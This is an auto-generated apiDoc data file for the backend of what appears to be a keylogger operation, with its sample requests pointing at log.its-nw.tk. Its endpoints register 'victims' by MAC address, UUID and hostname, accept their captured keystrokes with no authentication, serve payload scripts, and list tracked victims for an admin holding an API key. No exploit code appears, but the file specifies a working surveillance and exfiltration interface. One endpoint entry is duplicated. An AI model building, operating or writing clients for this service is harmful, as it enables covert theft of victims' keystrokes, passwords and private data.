define({ "api": [
  {
    "type": "get",
    "url": "/",
    "title": "Info landing page",
    "description": "<p>This is just the landing page, if you do not know how to use, this provides some basic information about this software.</p>",
    "name": "InfoPage",
    "group": "Info",
    "version": "0.0.0",
    "filename": "routes/info.js",
    "groupTitle": "Info",
    "sampleRequest": [
      {
        "url": "https://log.its-nw.tk/"
      }
    ]
  },
  {
    "type": "post",
    "url": "/api/victims/:id/logs",
    "title": "Create logs for specific victim",
    "name": "CreateLog",
    "group": "Log",
    "permission": [
      {
        "name": "None"
      }
    ],
    "parameter": {
      "fields": {
        "Parameter": [
          {
            "group": "Parameter",
            "type": "String",
            "optional": false,
            "field": "keystrokes",
            "description": "<p>Keystrokes to add in database</p>"
          }
        ]
      }
    },
    "success": {
      "fields": {
        "Success 200": [
          {
            "group": "Success 200",
            "type": "Object",
            "optional": false,
            "field": "message",
            "description": ""
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/api.js",
    "groupTitle": "Log",
    "sampleRequest": [
      {
        "url": "https://log.its-nw.tk/api/victims/:id/logs"
      }
    ]
  },
  {
    "type": "post",
    "url": "/api/victims",
    "title": "Create the victim to log",
    "name": "CreateVictim",
    "group": "Log",
    "permission": [
      {
        "name": "None"
      }
    ],
    "parameter": {
      "fields": {
        "Parameter": [
          {
            "group": "Parameter",
            "type": "String",
            "optional": false,
            "field": "MACAddress",
            "description": "<p>Victims MAC</p>"
          },
          {
            "group": "Parameter",
            "type": "String",
            "optional": false,
            "field": "UUID",
            "description": ""
          },
          {
            "group": "Parameter",
            "type": "String",
            "optional": false,
            "field": "Hostname",
            "description": ""
          }
        ]
      }
    },
    "success": {
      "fields": {
        "Success 200": [
          {
            "group": "Success 200",
            "type": "Object",
            "optional": false,
            "field": "Victim",
            "description": "<p>Returns victim object with all attributes</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/api.js",
    "groupTitle": "Log",
    "sampleRequest": [
      {
        "url": "https://log.its-nw.tk/api/victims"
      }
    ]
  },
  {
    "type": "get",
    "url": "/payloads/",
    "title": "Request listing of available payloads",
    "name": "GetAllPayloads",
    "group": "Payloads",
    "success": {
      "fields": {
        "Success 200": [
          {
            "group": "Success 200",
            "type": "Array",
            "optional": false,
            "field": "payloads",
            "description": "<p>available payloads</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/payload.js",
    "groupTitle": "Payloads",
    "sampleRequest": [
      {
        "url": "https://log.its-nw.tk/payloads/"
      }
    ]
  },
  {
    "type": "get",
    "url": "/payloads/:payloadName",
    "title": "Get content of specific payload",
    "name": "GetPayloads",
    "group": "Payloads",
    "success": {
      "fields": {
        "Success 200": [
          {
            "group": "Success 200",
            "type": "String",
            "optional": false,
            "field": "PayloadName",
            "description": "<p>preprocessed payload script file</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/payload.js",
    "groupTitle": "Payloads",
    "sampleRequest": [
      {
        "url": "https://log.its-nw.tk/payloads/:payloadName"
      }
    ]
  },
  {
    "type": "get",
    "url": "/api/victims",
    "title": "Request listing of vicitms",
    "name": "GetAllVictims",
    "group": "Victims",
    "permission": [
      {
        "name": "Admin"
      }
    ],
    "success": {
      "fields": {
        "Success 200": [
          {
            "group": "Success 200",
            "type": "Array",
            "optional": false,
            "field": "victims",
            "description": "<p>victims which are already tracked</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/api.js",
    "groupTitle": "Victims",
    "sampleRequest": [
      {
        "url": "https://log.its-nw.tk/api/victims"
      }
    ],
    "parameter": {
      "fields": {
        "Parameter": [
          {
            "group": "Parameter",
            "type": "String",
            "optional": false,
            "field": "apikey",
            "description": "<p>Mandatory, but only once; either this or by using headers</p>"
          }
        ]
      }
    },
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "X-API-KEY",
            "description": "<p>Mandatory, but only once; either this or by using querystring</p>"
          }
        ]
      }
    },
    "error": {
      "fields": {
        "Error 4xx": [
          {
            "group": "Error 4xx",
            "optional": false,
            "field": "Unauthorized",
            "description": ""
          }
        ]
      }
    }
  },
  {
    "type": "get",
    "url": "/api/victims/:id",
    "title": "Request attributes from specific victim",
    "name": "GetVictim",
    "group": "Victims",
    "permission": [
      {
        "name": "Admin"
      }
    ],
    "parameter": {
      "fields": {
        "Parameter": [
          {
            "group": "Parameter",
            "type": "Number",
            "optional": false,
            "field": "id",
            "description": "<p>Victims unique id</p>"
          },
          {
            "group": "Parameter",
            "type": "String",
            "optional": false,
            "field": "apikey",
            "description": "<p>Mandatory, but only once; either this or by using headers</p>"
          }
        ]
      }
    },
    "success": {
      "fields": {
        "Success 200": [
          {
            "group": "Success 200",
            "type": "Victim",
            "optional": false,
            "field": "victim",
            "description": "<p>single victim which is already tracked</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/api.js",
    "groupTitle": "Victims",
    "sampleRequest": [
      {
        "url": "https://log.its-nw.tk/api/victims/:id"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "X-API-KEY",
            "description": "<p>Mandatory, but only once; either this or by using querystring</p>"
          }
        ]
      }
    },
    "error": {
      "fields": {
        "Error 4xx": [
          {
            "group": "Error 4xx",
            "optional": false,
            "field": "Unauthorized",
            "description": ""
          }
        ]
      }
    }
  },
  {
    "type": "get",
    "url": "/api/victims/:id",
    "title": "Request attributes from specific victim",
    "name": "GetVictim",
    "group": "Victims",
    "permission": [
      {
        "name": "Admin"
      }
    ],
    "parameter": {
      "fields": {
        "Parameter": [
          {
            "group": "Parameter",
            "type": "Number",
            "optional": false,
            "field": "id",
            "description": "<p>Victims unique id</p>"
          },
          {
            "group": "Parameter",
            "type": "String",
            "optional": false,
            "field": "apikey",
            "description": "<p>Mandatory, but only once; either this or by using headers</p>"
          }
        ]
      }
    },
    "success": {
      "fields": {
        "Success 200": [
          {
            "group": "Success 200",
            "type": "Victim",
            "optional": false,
            "field": "victim",
            "description": "<p>single victim which is already tracked</p>"
          }
        ]
      }
    },
    "version": "0.0.0",
    "filename": "routes/api.js",
    "groupTitle": "Victims",
    "sampleRequest": [
      {
        "url": "https://log.its-nw.tk/api/victims/:id"
      }
    ],
    "header": {
      "fields": {
        "Header": [
          {
            "group": "Header",
            "type": "String",
            "optional": false,
            "field": "X-API-KEY",
            "description": "<p>Mandatory, but only once; either this or by using querystring</p>"
          }
        ]
      }
    },
    "error": {
      "fields": {
        "Error 4xx": [
          {
            "group": "Error 4xx",
            "optional": false,
            "field": "Unauthorized",
            "description": ""
          }
        ]
      }
    }
  }
] });
